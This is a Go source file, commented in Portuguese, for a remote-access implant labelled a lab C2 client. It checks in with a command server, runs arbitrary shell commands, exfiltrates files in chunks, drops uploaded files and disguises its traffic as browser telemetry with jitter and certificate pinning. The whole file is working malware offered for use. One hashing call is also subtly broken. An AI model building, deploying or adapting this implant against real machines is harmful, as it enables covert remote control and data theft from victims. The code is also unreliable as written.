// Implant C2 v2 — chunked download (T1105), certificate pinning,
// config por build (ldflags) e mímica de tráfego. Uso em lab autorizado.
package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	_ "embed"

	"github.com/seuusuario/lab-c2/internal/proto"
)

// ============================================================
// CONFIG POR BUILD — injetada via -ldflags -X no Makefile.
// Cada build (cada "vítima") tem URL e segredo próprios:
// capturar um implante não compromete a operação inteira.
// ============================================================

var (
	C2_URL = "https://192.168.1.50:443/api/v1/telemetry" // -X main.C2_URL=...
	SECRET = "chave-super-secreta-do-lab"                // -X main.SECRET=...
	SLEEP  = 15
)

//go:embed c2.crt
var pinnedCertPEM []byte // cert do C2 embutido no build → certificate pinning

var (
	sleepTime       = SLEEP
	pending         []proto.Result
	lastDownload    []byte
	lastDownloadUID string
	currentTaskData []byte
	activeDownload  *downloadState
)

// downloadState: máquina de estados da exfiltração em chunks
type downloadState struct {
	file  *os.File
	name  string
	seq   int
	total int
	hash  string
	uid   string
}

func main() {
	key := proto.DeriveKey(SECRET)
	id := newID()

	info := proto.SysInfo{
		Hostname: hostname(),
		User:     currentUser(),
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		PID:      os.Getpid(),
	}

	for {
		msg := proto.Message{ID: id, Kind: "checkin", Info: info}

		var resp proto.Message
		if err := beacon(key, &msg, &resp); err == nil {
			for _, task := range resp.Tasks {
				currentTaskData = task.Data
				out, ok := runTask(task.UID, task.Cmd)
				res := proto.Result{UID: task.UID, Output: out, Success: ok}

				if task.UID == lastDownloadUID && lastDownload != nil {
					res.Data = lastDownload
					lastDownload = nil
					lastDownloadUID = ""
				}
				pending = append(pending, res)
			}

			// continua transferência em andamento — 1 chunk por beacon
			pumpDownloadChunk()
		}

		jitterSleep()
	}
}

// ============================================================
// T1105 — DOWNLOAD EM CHUNKS (256 KB / beacon)
// ============================================================

func startDownload(taskUID, path string) (string, bool) {
	f, err := os.Open(path)
	if err != nil {
		return "erro ao abrir: " + err.Error(), false
	}
	st, err := f.Stat()
	if err != nil || st.IsDir() {
		f.Close()
		return "caminho inválido", false
	}

	// hash SHA-256 do arquivo completo (streaming, sem carregar na RAM)
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		f.Close()
		return "erro ao hash: " + err.Error(), false
	}
	if _, err := f.Seek(0, io.SeekStart); err != nil {
		f.Close()
		return "erro de seek", false
	}

	total := (int(st.Size()) + proto.CHUNK_SIZE - 1) / proto.CHUNK_SIZE
	activeDownload = &downloadState{
		file: f, name: st.Name(), seq: 0, total: total,
		hash: hex.EncodeToString(h.Sum256()[:]), uid: taskUID,
	}
	return fmt.Sprintf("transferência iniciada: %s (%d bytes, %d chunks)",
		path, st.Size(), total), true
}

// pumpDownloadChunk lê o próximo chunk e agenda no próximo beacon.
func pumpDownloadChunk() {
	if activeDownload == nil {
		return
	}
	d := activeDownload
	buf := make([]byte, proto.CHUNK_SIZE)
	n, err := d.file.Read(buf)

	if n > 0 {
		d.seq++
		res := proto.Result{
			UID: d.uid, Success: true,
			Output:   fmt.Sprintf("chunk %d/%d", d.seq, d.total),
			Data:     buf[:n],
			Seq:      d.seq, Total: d.total,
			FileName: d.name, Hash: d.hash, // hash vai em todos (server usa o 1º)
		}
		pending = append(pending, res)
	}
	if err == io.EOF || (n < proto.CHUNK_SIZE && d.seq >= d.total) {
		d.file.Close()
		activeDownload = nil
	}
}

// ============================================================
// DESPACHO DE TASKS
// ============================================================

func runTask(taskUID, cmd string) (string, bool) {
	fields := strings.SplitN(cmd, " ", 2)
	switch fields[0] {
	case "shell":
		if len(fields) < 2 {
			return "uso: shell <cmd>", false
		}
		return shellExec(fields[1])
	case "sleep":
		if len(fields) < 2 {
			return "uso: sleep <segundos>", false
		}
		n, err := strconv.Atoi(fields[1])
		if err != nil || n < 1 || n > 86400 {
			return "valor inválido", false
		}
		sleepTime = n
		return fmt.Sprintf("intervalo: %ds", n), true
	case "download":
		if len(fields) < 2 {
			return "uso: download <caminho>", false
		}
		return startDownload(taskUID, fields[1])
	case "upload":
		if len(fields) < 2 {
			return "uso: upload <destino>", false
		}
		if err := os.WriteFile(fields[1], currentTaskData, 0644); err != nil {
			return "erro ao gravar: " + err.Error(), false
		}
		return fmt.Sprintf("gravado: %s (%d bytes)", fields[1], len(currentTaskData)), true
	case "exit":
		os.Exit(0)
	default:
		return "task desconhecida: " + cmd, false
	}
}

func shellExec(cmd string) (string, bool) {
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/C", cmd)
	} else {
		c = exec.Command("sh", "-c", cmd)
	}
	var out bytes.Buffer
	c.Stdout, c.Stderr = &out, &out
	err := c.Run()
	return out.String(), err == nil
}

// ============================================================
// BEACON — pinning + mímica de tráfego
// ============================================================

func beacon(key []byte, msg *proto.Message, out *proto.Message) error {
	msg.Results = pending

	enc, err := proto.EncodeMessage(key, msg)
	if err != nil {
		return err
	}

	client := &http.Client{
		Transport: &http.Transport{TLSClientConfig: pinnedTLSConfig()},
		Timeout:   30 * time.Second,
	}

	req, err := http.NewRequest("POST", C2_URL, strings.NewReader(enc))
	if err != nil {
		return err
	}
	// ===== MÍMICA DE TRÁFEGO: o beacon se parece com telemetria de browser =====
	req.Header.Set("User-Agent",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "+
			"(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Connection", "keep-alive")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	pending = nil
	return proto.DecodeMessage(key, string(body), out)
}

// pinnedTLSConfig: confiança SOMENTE no cert embutido no build.
// O pin (SHA-256 do SubjectPublicKeyInfo) autentica o server — mesmo com
// InsecureSkipVerify (necessário pois o cert não é de CA pública), um MITM
// é impossível: só o dono da chave privada do C2 passa no VerifyPeerCertificate.
func pinnedTLSConfig() *tls.Config {
	block, _ := pem.Decode(pinnedCertPEM)
	if block == nil {
		panic("c2.crt embutido inválido — copie o cert do server antes de compilar")
	}
	pinned, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		panic("cert embutido corrupto")
	}
	pin := sha256.Sum256(pinned.RawSubjectPublicKeyInfo)

	return &tls.Config{
		InsecureSkipVerify: true, // seguro AQUI: a autenticação vem do pin
		VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
			remote, err := x509.ParseCertificate(rawCerts[0])
			if err != nil {
				return err
			}
			got := sha256.Sum256(remote.RawSubjectPublicKeyInfo)
			if got != pin {
				return fmt.Errorf("cert não confere — possível MITM")
			}
			return nil
		},
	}
}

// ============================================================
// OPSEC + utilitários
// ============================================================

func jitterSleep() {
	j := float64(sleepTime) * 0.3
	time.Sleep(time.Duration((float64(sleepTime)+(rand.Float64()*2-1)*j) * float64(time.Second)))
}

func newID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return fmt.Sprintf("%x", b)
}

func hostname() string {
	h, err := os.Hostname()
	if err != nil {
		return "?"
	}
	return h
}

func currentUser() string {
	if u := os.Getenv("USERNAME"); u != "" {
		return u
	}
	return os.Getenv("USER")
}
